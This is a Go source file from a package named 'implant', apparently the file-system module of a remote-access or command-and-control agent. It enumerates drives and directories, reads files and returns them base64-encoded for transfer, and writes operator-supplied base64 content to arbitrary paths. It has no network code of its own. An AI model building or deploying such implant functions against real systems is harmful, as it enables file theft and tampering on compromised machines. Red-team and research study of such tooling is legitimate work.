package implant

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
)

// FileInfo describes a single file or directory entry.
type FileInfo struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	IsDir   bool   `json:"is_dir"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time"`
}

// ListDir returns a JSON-encoded list of directory entries.
func ListDir(dirPath string) ([]byte, error) {
	if dirPath == "" {
		dirPath = "."
	}

	entries, err := os.ReadDir(dirPath)
	if err != nil {
		return nil, fmt.Errorf("reading directory %s: %w", dirPath, err)
	}

	absPath, _ := filepath.Abs(dirPath)
	var files []FileInfo

	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		fullPath := filepath.Join(absPath, e.Name())
		files = append(files, FileInfo{
			Name:    e.Name(),
			Path:    fullPath,
			IsDir:   e.IsDir(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	// Sort: directories first, then by name
	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir != files[j].IsDir {
			return files[i].IsDir
		}
		return strings.ToLower(files[i].Name) < strings.ToLower(files[j].Name)
	})

	result := map[string]interface{}{
		"path":  absPath,
		"files": files,
	}
	data, err := json.Marshal(result)
	if err != nil {
		return nil, fmt.Errorf("marshaling file list: %w", err)
	}
	return data, nil
}

// ReadFile reads a file and returns base64-encoded content.
func ReadFileContent(filePath string) ([]byte, error) {
	const maxSize = 10 * 1024 * 1024 // 10 MB limit for MVP

	info, err := os.Stat(filePath)
	if err != nil {
		return nil, fmt.Errorf("stat %s: %w", filePath, err)
	}
	if info.IsDir() {
		return nil, fmt.Errorf("%s is a directory", filePath)
	}
	if info.Size() > maxSize {
		return nil, fmt.Errorf("file too large: %d bytes (max %d)", info.Size(), maxSize)
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("reading %s: %w", filePath, err)
	}

	// Return as JSON with base64 content
	result := map[string]interface{}{
		"path":    filePath,
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	}
	jsonData, err := json.Marshal(result)
	if err != nil {
		return nil, fmt.Errorf("marshaling file content: %w", err)
	}
	return jsonData, nil
}

// WriteFileContent writes base64-encoded content to a file.
// The arguments string format is: "<path>|<base64-content>"
func WriteFileContent(args string) ([]byte, error) {
	parts := strings.SplitN(args, "|", 2)
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid writefile arguments, expected: <path>|<base64-content>")
	}

	filePath := parts[0]
	content, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, fmt.Errorf("decoding content: %w", err)
	}

	// Create parent directories if needed
	dir := filepath.Dir(filePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return nil, fmt.Errorf("creating directory %s: %w", dir, err)
	}

	if err := os.WriteFile(filePath, content, 0644); err != nil {
		return nil, fmt.Errorf("writing %s: %w", filePath, err)
	}

	return []byte(fmt.Sprintf("Written %d bytes to %s", len(content), filePath)), nil
}

// ListDrives returns JSON list of available drives (Windows) or root (Linux).
func ListDrives() ([]byte, error) {
	var drives []map[string]interface{}

	// On Windows, enumerate drive letters
	// On Linux, just return "/"
	if isWindows() {
		for _, drive := range getWindowsDrives() {
			drives = append(drives, map[string]interface{}{
				"name": drive,
				"path": drive,
			})
		}
	} else {
		drives = append(drives, map[string]interface{}{
			"name": "/",
			"path": "/",
		})
	}

	// Also add common directories
	result := map[string]interface{}{
		"drives": drives,
	}
	data, _ := json.Marshal(result)
	return data, nil
}

func isWindows() bool { return runtime.GOOS == "windows" }

func getWindowsDrives() []string {
	var drives []string
	for c := 'A'; c <= 'Z'; c++ {
		path := string(c) + ":\\"
		if _, err := os.Stat(path); err == nil {
			drives = append(drives, path)
		}
	}
	return drives
}

// formatSize returns a human-readable file size.
func formatSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

func init() {
	_ = formatSize // avoid unused warning
}
